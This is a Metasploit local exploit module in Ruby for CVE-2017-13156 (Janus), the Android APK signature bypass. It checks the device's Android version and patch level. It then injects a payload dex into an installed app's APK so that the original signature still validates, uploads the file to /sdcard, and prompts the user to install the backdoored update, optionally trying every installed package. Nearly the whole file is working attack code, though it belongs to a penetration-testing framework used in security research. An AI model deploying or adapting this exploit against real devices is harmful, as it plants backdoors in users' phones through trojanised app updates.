# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core/payload/apk&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Android::Priv
  include Msf::Payload::Android

  def initialize(info={})
    super( update_info( info, {
      &#039;Name&#039;           => "Android Janus APK Signature bypass",
      &#039;Description&#039;    => %q{
        This module exploits CVE-2017-13156 in Android to install a payload into another
        application. The payload APK will have the same signature and can be installed
        The vulnerability was fixed in the 5th December 2017 security patch, and was
        additionally fixed by the APK Signature scheme v2, so only APKs signed with
        the v1 scheme are vulnerable.
        Payload handler is disabled, and a multi/handler must be started first.
      },
      &#039;Author&#039;         => [
        &#039;GuardSquare&#039;, # discovery
        &#039;V-E-O&#039;,       # proof of concept
        &#039;timwr&#039;,       # metasploit module
        &#039;h00die&#039;,      # metasploit module
      ],
      &#039;References&#039;     => [
        [ &#039;CVE&#039;, &#039;2017-13156&#039; ],
        [ &#039;URL&#039;, &#039;https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures&#039; ],
        [ &#039;URL&#039;, &#039;https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156&#039; ],
      ],
      &#039;DisclosureDate&#039; => &#039;Jul 31 2017&#039;,
      &#039;Platform&#039;       => [ &#039;android&#039; ],
      &#039;Arch&#039;           => [ ARCH_DALVIK ],
      &#039;Targets&#039;        => [ [ &#039;Automatic&#039;, {} ] ],
      &#039;DefaultOptions&#039; => {
        &#039;AndroidWakelock&#039; => false, # the target may not have the WAKE_LOCK permission
        &#039;DisablePayloadHandler&#039; => true,
      },
      &#039;DefaultTarget&#039;  => 0,
      &#039;Notes&#039; => {
        &#039;SideEffects&#039; => [&#039;ARTIFACTS_ON_DISK&#039;, &#039;SCREEN_EFFECTS&#039;],
        &#039;Stability&#039; => [&#039;SERVICE_RESOURCE_LOSS&#039;], # ZTE youtube app won&#039;t start anymore
      }
    }))
    register_options([
      OptString.new(&#039;PACKAGE&#039;, [true, &#039;The package to target, or ALL to attempt all&#039;, &#039;com.phonegap.camerasample&#039;]),
    ])
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
    ]
  end

  def check
    os = cmd_exec("getprop ro.build.version.release")
    unless Gem::Version.new(os).between?(Gem::Version.new(&#039;5.1.1&#039;), Gem::Version.new(&#039;8.0.0&#039;))
      vprint_error "Android version #{os} is not vulnerable."
      return CheckCode::Safe
    end
    vprint_good "Android version #{os} appears to be vulnerable."

    patch = cmd_exec(&#039;getprop ro.build.version.security_patch&#039;)
    if patch.empty?
      print_status &#039;Unable to determine patch level.  Pre-5.0 this is unaccessible.&#039;
    elsif patch > &#039;2017-12-05&#039;
      vprint_error "Android security patch level #{patch} is patched."
      return CheckCode::Safe
    else
      vprint_good "Android security patch level #{patch} is vulnerable"
    end

    CheckCode::Appears
  end

  def exploit

    def infect(apkfile)
      unless apkfile.start_with?("package:")
        fail_with Failure::BadConfig, &#039;Unable to locate app apk&#039;
      end
      apkfile = apkfile[8..-1]
      print_status "Downloading APK: #{apkfile}"
      apk_data = read_file(apkfile)

      begin
        # Create an apk with the payload injected
        apk_backdoor = ::Msf::Payload::Apk.new
        apk_zip = apk_backdoor.backdoor_apk(nil, payload.encoded, false, false, apk_data, false)

        # Extract the classes.dex
        dex_data = &#039;&#039;
        Zip::File.open_buffer(apk_zip) do |zipfile|
          dex_data = zipfile.read("classes.dex")
        end
        dex_size = dex_data.length

        # Fix the original APKs zip file code directory
        cd_end_addr = apk_data.rindex("\x50\x4b\x05\x06")
        cd_start_addr = apk_data[cd_end_addr+16, cd_end_addr+20].unpack("V")[0]
        apk_data[cd_end_addr+16...cd_end_addr+20] = [ cd_start_addr+dex_size ].pack("V")
        pos = cd_start_addr
        while pos && pos < cd_end_addr
          offset = apk_data[pos+42, pos+46].unpack("V")[0]
          apk_data[pos+42...pos+46] = [ offset+dex_size ].pack("V")
          pos = apk_data.index("\x50\x4b\x01\x02", pos+46)
        end

        # Prepend the new classes.dex to the apk
        out_data = dex_data + apk_data
        out_data[32...36] = [ out_data.length ].pack("V")
        out_data = fix_dex_header(out_data)

        out_apk = "/sdcard/#{Rex::Text.rand_text_alphanumeric 6}.apk"
        print_status "Uploading APK: #{out_apk}"
        write_file(out_apk, out_data)
        register_file_for_cleanup(out_apk)
        print_status "APK uploaded"

        # Prompt the user to update the APK
        session.appapi.app_install(out_apk)
        print_status "User should now have a prompt to install an updated version of the app"
        true
      rescue => e
        print_error e.to_s
        false
      end
    end

    unless [CheckCode::Detected, CheckCode::Appears].include? check
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if datastore["PACKAGE"] == &#039;ALL&#039;
      vprint_status(&#039;Finding installed packages (this can take a few minutes depending on list of installed packages)&#039;)
      apkfiles = []
      all = cmd_exec("pm list packages").split("\n")
      c = 1
      all.each do |package|
        package = package.split(&#039;:&#039;)[1]
        vprint_status("Attempting exploit of apk #{c}/#{all.length} for #{package}")
        c += 1
        next if [&#039;com.metasploit.stage&#039;, # avoid injecting into ourself
                ].include? package # This was left on purpose to be expanded as need be for testing
        result = infect(cmd_exec("pm path #{package}"))
        break if result
      end
    else
      infect(cmd_exec("pm path #{datastore["PACKAGE"]}"))
    end
  end
end

